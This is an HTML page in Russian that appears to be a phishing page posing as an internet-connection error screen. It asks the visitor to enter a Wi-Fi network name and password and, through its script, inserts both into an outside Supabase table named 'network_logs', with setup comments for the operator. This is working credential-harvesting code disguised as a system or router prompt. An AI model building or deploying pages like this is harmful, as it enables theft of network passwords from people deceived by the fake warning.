<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проблемы с подключением</title>
    <style>
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
            background: #1e1e2f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(12px);
            border-radius: 24px;
            padding: 35px 25px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
            text-align: center;
            color: #fff;
        }
        .warning-icon {
            font-size: 50px;
            margin-bottom: 15px;
        }
        h1 {
            font-size: 1.8rem;
            margin: 0 0 5px;
            font-weight: 600;
        }
        .sub {
            color: #ccc;
            margin-bottom: 25px;
        }
        label {
            display: block;
            text-align: left;
            margin: 12px 0 4px;
            font-size: 0.9rem;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 13px;
            border-radius: 14px;
            border: 1px solid rgba(255,255,255,0.3);
            background: rgba(0,0,0,0.3);
            color: white;
            font-size: 1rem;
            outline: none;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #f9a826;
            box-shadow: 0 0 0 3px rgba(249,168,38,0.3);
        }
        button {
            margin-top: 25px;
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 30px;
            background: #f9a826;
            color: #1e1e2f;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover {
            background: #ffb84d;
        }
        #message {
            margin-top: 15px;
            font-size: 0.9rem;
            min-height: 22px;
        }
        .success { color: #8cf58c; }
        .error { color: #ff8080; }
        .info { color: #ffd966; }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning-icon">⚠️</div>
        <h1>У вас проблемы с подключением к интернету</h1>
        <p class="sub">Проверьте сетевые параметры</p>

        <label for="ssid">Введите имя сети</label>
        <input type="text" id="ssid" placeholder="Название Wi‑Fi" autocomplete="off">

        <label for="pass">Введите пароль</label>
        <input type="password" id="pass" placeholder="Пароль сети" autocomplete="off">

        <button id="saveBtn">💾 Сохранить</button>
        <div id="message"></div>
        <p style="font-size:0.7rem; opacity:0.5; margin-top:20px;">Данные отправляются в Supabase</p>
    </div>

    <!-- Подключаем Supabase SDK -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        // ⚙️ НАСТРОЙКА: замените URL вашего проекта Supabase
        const SUPABASE_URL = "https://ваш-проект.supabase.co"; // ⬅️ укажите реальный URL
        const SUPABASE_KEY = "sb_publishable_n98OKq8UriMSC17FzB60CQ_zHzf6W83";

        // Инициализация клиента Supabase
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        const ssidInput = document.getElementById("ssid");
        const passInput = document.getElementById("pass");
        const saveBtn = document.getElementById("saveBtn");
        const msgDiv = document.getElementById("message");

        // Отображение сообщений
        function showMessage(text, type) {
            msgDiv.textContent = text;
            msgDiv.className = type; // success, error, info
        }

        // Сохранение в таблицу Supabase (создайте таблицу network_logs с колонками ssid и password)
        async function saveToSupabase(ssid, password) {
            const { data, error } = await supabase
                .from("network_logs")      // ⬅️ имя таблицы (создайте заранее)
                .insert([{ ssid: ssid, password: password }]);

            if (error) {
                console.error("Ошибка Supabase:", error);
                showMessage("Ошибка сохранения: " + error.message, "error");
            } else {
                showMessage("✅ Данные успешно сохранены!", "success");
                // Очистка полей после успеха
                ssidInput.value = "";
                passInput.value = "";
            }
        }

        // Обработчик кнопки
        saveBtn.addEventListener("click", async () => {
            const ssid = ssidInput.value.trim();
            const pass = passInput.value.trim();

            if (!ssid || !pass) {
                showMessage("Пожалуйста, заполните оба поля", "info");
                return;
            }

            // Показываем, что идёт отправка
            showMessage("Сохранение...", "info");
            await saveToSupabase(ssid, pass);
        });

        // Дополнительно: можно сохранять локально, если Supabase недоступен
    </script>
</body>
</html>
